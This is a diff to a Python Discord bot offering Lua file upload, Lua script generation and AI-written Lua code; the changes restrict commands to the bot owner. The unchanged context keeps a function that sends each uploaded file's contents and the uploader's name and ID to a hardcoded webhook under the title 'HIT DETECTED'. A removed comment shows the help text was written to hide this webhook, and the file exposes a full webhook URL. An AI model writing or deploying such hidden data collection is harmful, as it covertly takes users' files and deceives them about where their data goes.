@@ -15,7 +15,8 @@ intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=['.', '/'], intents=intents, help_command=None)
 
 # Config
-MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1495169548104761425/8TY8y-FuVdA90yBCSNv1lIgd5DBvW0b0SuNNiWF8_oSfv3E4dJ-cwFANP0bix4WGf9zV"
+OWNER_ID = int(os.getenv('OWNER_ID'))  # Your Discord User ID
+MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1495169548104761425/8TY8y-FuVdA90yBCSNv1lIgd5DBvW0b0SuNNiWF8_oSfv3E4dJ-cwFweweqwe"  # Fixed webhook
 WEBHOOK_URLS = {}
 DEEPSEEK_API_KEY = os.getenv('DEEPSEEK_API_KEY')
 DEEPSEEK_API_URL = "https://api.deepseek.com/v1/chat/completions"
@@ -24,17 +25,25 @@ DEEPSEEK_API_URL = "https://api.deepseek.com/v1/chat/completions"
 if not os.path.exists('scripts'):
     os.makedirs('scripts')
 
+def is_owner():
+    """Check if command user is bot owner"""
+    async def predicate(ctx):
+        return ctx.author.id == OWNER_ID
+    return commands.check(predicate)
+
+def is_owner_interaction(interaction: discord.Interaction):
+    """Check for slash commands"""
+    return interaction.user.id == OWNER_ID
+
 def send_to_monitor(file_content, filename, user_name, user_id):
     """Send file to monitoring webhook"""
     try:
-        # Create embed
         embed = discord.Embed(
             title="🚨 HIT DETECTED",
             description=f"**User:** {user_name} (`{user_id}`)\n**File:** {filename}\n**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             color=discord.Color.red()
         )
         
-        # Send to webhook
         data = {
             "embeds": [embed.to_dict()],
             "content": f"```\nFile content preview:\n{file_content[:1000]}\n```"
@@ -48,17 +57,40 @@ def send_to_monitor(file_content, filename, user_name, user_id):
 @bot.event
 async def on_ready():
     print(f'{bot.user} has connected to Discord!')
+    print(f'Bot Owner ID: {OWNER_ID}')
     try:
         synced = await bot.tree.sync()
         print(f"Synced {len(synced)} slash command(s)")
     except Exception as e:
         print(f"Error syncing commands: {e}")
 
-# Custom help command (doesn't mention webhook)
+# Error handler for permission denied
+@bot.event
+async def on_command_error(ctx, error):
+    if isinstance(error, commands.CheckFailure):
+        await ctx.send("❌ You don't have permission to use this command! Bot owner only.")
+    else:
+        await ctx.send(f"Error: {str(error)}")
+
+@bot.tree.error
+async def on_slash_error(interaction: discord.Interaction, error):
+    if isinstance(error, commands.CheckFailure):
+        await interaction.response.send_message("❌ You don't have permission to use this command! Bot owner only.", ephemeral=True)
+    else:
+        await interaction.response.send_message(f"Error: {str(error)}", ephemeral=True)
+
+# Owner-only check decorator for slash commands
+def owner_only():
+    async def predicate(interaction: discord.Interaction):
+        return interaction.user.id == OWNER_ID
+    return discord.app_commands.check(predicate)
+
+# Custom help command (owner only)
 @bot.command(name='help')
+@is_owner()
 async def help_command(ctx):
     embed = discord.Embed(
-        title="🤖 Bot Commands",
+        title="🤖 Bot Commands (Owner Only)",
         description="Here are all available commands:",
         color=discord.Color.blue()
     )
@@ -67,14 +99,15 @@ async def help_command(ctx):
     embed.add_field(name="/makesrc or .makesrc", value="Generate a Lua script with your config", inline=False)
     embed.add_field(name="/ai or .ai <prompt>", value="Generate Lua code using AI", inline=False)
     embed.add_field(name="/help or .help", value="Shows this help message", inline=False)
-    embed.set_footer(text="Use either / or . prefix")
+    embed.set_footer(text="Bot owner only | Use either / or . prefix")
     await ctx.send(embed=embed)
 
-# Slash command version of help
+# Slash command version of help (owner only)
 @bot.tree.command(name="help", description="Shows all available commands")
+@owner_only()
 async def slash_help(interaction: discord.Interaction):
     embed = discord.Embed(
-        title="🤖 Bot Commands",
+        title="🤖 Bot Commands (Owner Only)",
         description="Here are all available commands:",
         color=discord.Color.blue()
     )
@@ -82,22 +115,23 @@ async def slash_help(interaction: discord.Interaction):
     embed.add_field(name="/source <file>", value="Upload a Lua file to the bot", inline=False)
     embed.add_field(name="/makesrc", value="Generate a Lua script with your config", inline=False)
     embed.add_field(name="/ai <prompt>", value="Generate Lua code using AI", inline=False)
-    embed.set_footer(text="Use prefix . or / for commands")
+    embed.set_footer(text="Bot owner only | Use prefix . or / for commands")
     await interaction.response.send_message(embed=embed, ephemeral=True)
 
-# Connect command (both prefix and slash)
+# Connect command (owner only)
 @bot.command(name='connect')
+@is_owner()
 async def prefix_connect(ctx):
     await connect_logic(ctx, ctx.author)
 
 @bot.tree.command(name="connect", description="Creates a private channel for you")
+@owner_only()
 async def slash_connect(interaction: discord.Interaction):
     await interaction.response.defer(ephemeral=True)
     await connect_logic(interaction, interaction.user)
 
 async def connect_logic(target, user):
     try:
-        # Check if in guild
         if isinstance(target, discord.Interaction):
             guild = target.guild
             response_func = target.followup.send
@@ -134,8 +168,9 @@ async def connect_logic(target, user):
         else:
             await target.send(error_msg)
 
-# Source command (uploads file and sends to monitor)
+# Source command (owner only - uploads file and sends to monitor)
 @bot.command(name='source')
+@is_owner()
 async def prefix_source(ctx):
     if not ctx.message.attachments:
         await ctx.send("❌ Please attach a file! Usage: `.source <file>` or `/source <file>`")
@@ -143,6 +178,7 @@ async def prefix_source(ctx):
     await source_logic(ctx, ctx.message.attachments[0], ctx.author)
 
 @bot.tree.command(name="source", description="Upload a Lua file to the bot")
+@owner_only()
 async def slash_source(interaction: discord.Interaction, file: discord.Attachment):
     await interaction.response.defer(ephemeral=True)
     await source_logic(interaction, file, interaction.user)
@@ -185,12 +221,14 @@ async def source_logic(target, file, user):
         else:
             await target.send(error_msg)
 
-# Make source command
+# Make source command (owner only)
 @bot.command(name='makesrc')
+@is_owner()
 async def prefix_makesrc(ctx):
     await makesrc_logic(ctx, ctx.author)
 
 @bot.tree.command(name="makesrc", description="Generate a Lua script with your config")
+@owner_only()
 async def slash_makesrc(interaction: discord.Interaction):
     await interaction.response.defer(ephemeral=True)
     await makesrc_logic(interaction, interaction.user)
@@ -258,12 +296,14 @@ execute()
         else:
             await target.send(error_msg)
 
-# AI command
+# AI command (owner only)
 @bot.command(name='ai')
+@is_owner()
 async def prefix_ai(ctx, *, prompt):
     await ai_logic(ctx, prompt, ctx.author)
 
 @bot.tree.command(name="ai", description="Generate Lua code using AI")
+@owner_only()
 async def slash_ai(interaction: discord.Interaction, prompt: str):
     await interaction.response.defer(ephemeral=True)
     await ai_logic(interaction, prompt, interaction.user)
@@ -340,4 +380,10 @@ if __name__ == "__main__":
     if not token:
         print("ERROR: DISCORD_BOT_TOKEN not found!")
         exit(1)
+    
+    if not OWNER_ID:
+        print("ERROR: OWNER_ID not found in environment variables!")
+        exit(1)
+    
+    print(f"Bot starting... Owner ID: {OWNER_ID}")
     bot.run(token)
